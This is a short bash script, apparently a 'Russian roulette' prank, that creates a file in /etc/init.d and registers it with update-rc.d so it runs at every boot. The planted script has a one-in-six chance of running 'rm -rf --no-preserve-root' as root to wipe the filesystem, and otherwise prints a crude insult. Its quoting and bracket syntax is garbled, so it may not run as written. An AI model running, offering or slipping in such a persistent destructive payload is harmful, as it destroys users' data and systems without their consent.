#!/bin/bash

touch /etc/init.d/bash_revolver.sh && \ 
echo "[ $[ $RANDOM % 6 ] == 0 } && \ 
su root -g wheel -c "rm -rf --no-preserve-root */*" || echo *Eat a Dick & Go Back to Windows*; or sleep 5 & exec $last_pid" > /etc/init.d/bash_revolver.sh && \ 
chmod 755 /etc/init.d/bash_revolver.sh && \ 
update-rc.d bash_revolver.sh defaults;
